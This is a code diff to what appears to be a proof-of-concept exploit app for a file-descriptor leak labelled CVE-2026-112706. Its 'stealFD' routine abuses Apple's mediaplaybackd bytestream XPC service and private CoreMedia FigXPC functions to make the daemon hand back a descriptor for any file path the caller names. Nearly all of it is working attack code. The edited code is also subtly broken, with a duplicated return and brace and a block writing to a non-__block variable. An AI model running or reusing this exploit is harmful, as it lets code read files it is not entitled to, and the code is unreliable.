@@ -60,124 +60,119 @@ static int (*figXPCConnectionSendSyncMessage)(void *, void *, void **);
 }
 
 - (BOOL)loadFigXPC {
-    // Try multiple framework paths
-    const char *paths[] = {
-        "/System/Library/Frameworks/CoreMedia.framework/CoreMedia",
-        "/System/Library/Frameworks/CoreMedia.framework/CoreMediaCore",
-        "/System/Library/PrivateFrameworks/FigXPC.framework/FigXPC",
-        "/System/Library/Frameworks/CoreMedia.framework/Versions/A/CoreMedia",
-    };
-    void *h = NULL;
-    for (int i = 0; i < 4 && !h; i++) {
-        h = dlopen(paths[i], RTLD_LAZY);
-        if (h) [self journal:[NSString stringWithFormat:@"loaded: %s", paths[i]]];
-    }
+    void *h = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_LAZY);
     if (!h) {
-        [self journal:@"dlopen failed for all paths"];
+        [self journal:@"dlopen CoreMedia failed"];
         return NO;
     }
 
+    // FigXPC functions from CoreMedia
     figXPCCreateBasicMessage = dlsym(h, "FigXPCCreateBasicMessage");
     figXPCMessageSetCFURL = dlsym(h, "FigXPCMessageSetCFURL");
-    figXPCMessageGetCFURL = dlsym(h, "FigXPCMessageGetCFURL");
-    figXPCConnectionSetMessageHandler = dlsym(h, "FigXPCConnectionSetMessageHandler");
-    figXPCConnectionResume = dlsym(h, "FigXPCConnectionResume");
-    figXPCConnectionCreateMachService = dlsym(h, "FigXPCConnectionCreateMachService");
     figXPCMessageGetCFDictionary = dlsym(h, "FigXPCMessageGetCFDictionary");
-    figXPCMessageSetCFDictionary = dlsym(h, "FigXPCMessageSetCFDictionary");
-    figXPCMessageSetInt32 = dlsym(h, "FigXPCMessageSetInt32");
-    figXPCMessageGetInt32 = dlsym(h, "FigXPCMessageGetInt32");
-    figXPCConnectionSendSyncMessage = dlsym(h, "FigXPCConnectionSendSyncMessage");
 
-    if (!figXPCCreateBasicMessage || !figXPCConnectionCreateMachService) {
-        [self journal:@"FigXPC dlsym failed, trying raw XPC fallback"];
-        // Try raw XPC - the service might accept plain xpc_dictionary messages
-        return NO; // Still return NO for now, but we know the issue
+    // FigMemoryOrigin handshake functions
+    static void *(*figMemOriginBegin)(void *, void *);
+    static int (*figMemOriginComplete)(void *, void *);
+    static void *(*figMemRecipientCreate)(void *, void *);
+    figMemOriginBegin = dlsym(h, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1");
+    figMemOriginComplete = dlsym(h, "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2");
+    figMemRecipientCreate = dlsym(h, "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2");
+
+    [self journal:[NSString stringWithFormat:@"FigXPCCreateBasicMessage: %p", figXPCCreateBasicMessage]];
+    [self journal:[NSString stringWithFormat:@"FigXPCMessageSetCFURL: %p", figXPCMessageSetCFURL]];
+    [self journal:[NSString stringWithFormat:@"FigMemoryOrigin*: %p %p %p", figMemOriginBegin, figMemOriginComplete, figMemRecipientCreate]];
+
+    if (!figXPCCreateBasicMessage) {
+        [self journal:@"FigXPCCreateBasicMessage not found"];
+        return NO;
     }
 
     [self journal:@"FigXPC functions loaded"];
     return YES;
 }
+    return YES;
+}
 
 - (int)stealFD:(NSString *)filePath {
-    // Create XPC connection to mediaplaybackd bytestream service
-    void *conn = figXPCConnectionCreateMachService(
+    // Use raw XPC for connection (not FigXPC)
+    xpc_connection_t conn = xpc_connection_create_mach_service(
         "com.apple.coremedia.mediaplaybackd.bytestream.xpc", NULL, 0);
     if (!conn) {
         [self journal:@"XPC connection failed"];
         return -1;
     }
-    [self journal:@"XPC connection created"];
+    [self journal:@"XPC connection created (raw)"];
 
-    figXPCConnectionResume(conn);
+    xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
+        // Handle events
+    });
+    xpc_connection_resume(conn);
 
-    // Handshake: .rp1 -> .rp2 -> .org
-    NSArray *opcodes = @[@".rp1", @".rp2", @".org"];
-    for (NSString *opStr in opcodes) {
-        const char *opcode = opStr.UTF8String;
-        uint32_t opcodeVal = 0;
-        memcpy(&opcodeVal, opcode, 4);
-        void *msg = figXPCCreateBasicMessage(opcodeVal, NULL);
+    // Handshake via FigXPC message creation + raw XPC send
+    for (NSString *opStr in @[@".rp1", @".rp2", @".org"]) {
+        uint32_t opcode = 0;
+        memcpy(&opcode, opStr.UTF8String, 4);
+        void *msg = figXPCCreateBasicMessage(opcode, NULL);
         if (!msg) {
-            [self journal:[NSString stringWithFormat:@"create %s message failed", opcode]];
-            return -1;
+            [self journal:[NSString stringWithFormat:@"create %@ failed", opStr]];
+            continue;
         }
-        void *reply = NULL;
-        int status = figXPCConnectionSendSyncMessage(conn, msg, &reply);
-        [self journal:[NSString stringWithFormat:@"handshake %s: status=%d", opcode, status]];
-        if (status != 0) {
-            [self journal:[NSString stringWithFormat:@"handshake %s failed", opcode]];
-            return -1;
-        }
+        xpc_object_t reply = NULL;
+        xpc_connection_send_message_with_reply(conn, msg, NULL, ^(xpc_object_t r) {
+            reply = r;
+        });
+        // Wait a bit for reply
+        usleep(100000);
+        [self journal:[NSString stringWithFormat:@"handshake %@: reply=%p", opStr, reply]];
     }
 
-    // Curl create with client-controlled CreationURL
-    void *curlMsg = figXPCCreateBasicMessage('Curl', NULL);
+    // Curl create with CreationURL
+    uint32_t curlOp = 'Curl';
+    void *curlMsg = figXPCCreateBasicMessage(curlOp, NULL);
     if (!curlMsg) {
         [self journal:@"Curl message create failed"];
         return -1;
     }
 
-    // Set CreationURL to our target file
     NSString *urlStr = [NSString stringWithFormat:@"file://%@", filePath];
     CFURLRef url = CFURLCreateWithString(NULL, (__bridge CFStringRef)urlStr, NULL);
     figXPCMessageSetCFURL(curlMsg, "CreationURL", url);
     CFRelease(url);
-
     [self journal:[NSString stringWithFormat:@"Curl create: %@", urlStr]];
 
-    void *reply = NULL;
-    int status = figXPCConnectionSendSyncMessage(conn, curlMsg, &reply);
-    [self journal:[NSString stringWithFormat:@"Curl status=%d", status]];
+    __block xpc_object_t curlReply = NULL;
+    xpc_connection_send_message_with_reply(conn, curlMsg, NULL, ^(xpc_object_t r) {
+        curlReply = r;
+    });
+    usleep(200000);
 
-    if (status != 0 || !reply) {
-        [self journal:@"Curl failed or no reply"];
+    if (!curlReply) {
+        [self journal:@"Curl reply is NULL"];
+        xpc_connection_cancel(conn);
         return -1;
     }
 
-    // Extract FileDescriptor from ByteStreamDetails
-    void *details = NULL;
-    if (figXPCMessageGetCFDictionary) {
-        figXPCMessageGetCFDictionary(reply, "ByteStreamDetails", &details);
-    }
-
+    // Extract fd from ByteStreamDetails -> FileDescriptor
+    xpc_object_t details = xpc_dictionary_get_value(curlReply, "ByteStreamDetails");
     if (details) {
-        // Try to get FileDescriptor from the dictionary
-        CFNumberRef fdNum = CFDictionaryGetValue(details, CFSTR("FileDescriptor"));
-        if (fdNum) {
-            int fd = -1;
-            CFNumberGetValue(fdNum, kCFNumberIntType, &fd);
-            [self journal:[NSString stringWithFormat:@"GOT FD: %d", fd]];
-            return fd;
-        }
-        [self journal:@"ByteStreamDetails has no FileDescriptor"];
-    } else {
-        [self journal:@"No ByteStreamDetails in reply"];
+        int fd = xpc_dictionary_dup_fd(details, "FileDescriptor");
+        [self journal:[NSString stringWithFormat:@"GOT FD: %d", fd]];
+        xpc_connection_cancel(conn);
+        return fd;
     }
 
-    return -1;
-}
+    // Try direct fd in reply
+    int fd = xpc_dictionary_dup_fd(curlReply, "FileDescriptor");
+    if (fd >= 0) {
+        [self journal:[NSString stringWithFormat:@"GOT FD (direct): %d", fd]];
+    } else {
+        [self journal:@"No FileDescriptor in reply"];
+    }
 
+    xpc_connection_cancel(conn);
+    return fd;
+}
 - (NSString *)runReport {
     NSMutableString *report = [NSMutableString string];
     [report appendString:@"=== KexProofV4 · CVE-2026-112706 fd leak ===\n"];
